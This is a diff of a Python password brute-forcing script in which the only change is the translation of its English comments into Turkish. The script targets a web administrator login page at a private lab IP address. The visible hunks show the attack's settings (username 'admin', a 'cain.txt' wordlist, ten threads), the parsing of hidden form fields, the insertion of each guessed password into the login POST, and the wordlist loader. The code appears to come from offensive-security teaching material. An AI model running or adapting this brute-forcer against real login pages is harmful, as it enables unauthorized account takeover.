@@ -7,13 +7,13 @@ import urllib.request
 from abc import ABC
 from html.parser import HTMLParser
 
-# general settings
+# genel ayarlar
 user_thread = 10
 username = "admin"
 wordlist_file = "cain.txt"
 resume = None
 
-# target specific settings
+# hedefe özel ayarlar
 target_url = "http://192.168.112.131/administrator/index.php"
 target_post = "http://192.168.112.131/administrator/index.php"
 
@@ -64,13 +64,13 @@ class Bruter(object):
             print("Trying: %s : %s (%d left)" % (
                 self.username, brute, self.password_q.qsize()))
 
-            # parse out the hidden fields
+            # gizli alanları ayrıştır
             parser = BruteParser()
             parser.feed(page)
 
             post_tags = parser.tag_results
 
-            # add our username and password fields
+            # kullanıcı adı ve şifre alanlarını ekleyin
             post_tags[username_field] = self.username
             post_tags[password_field] = brute
 
@@ -89,7 +89,7 @@ class Bruter(object):
 
 
 def build_wordlist(wordlst_file):
-    # read in the word list
+    # kelime listesinde oku
     fd = open(wordlst_file, "r")
     raw_words = [line.rstrip('\n') for line in fd]
     fd.close()
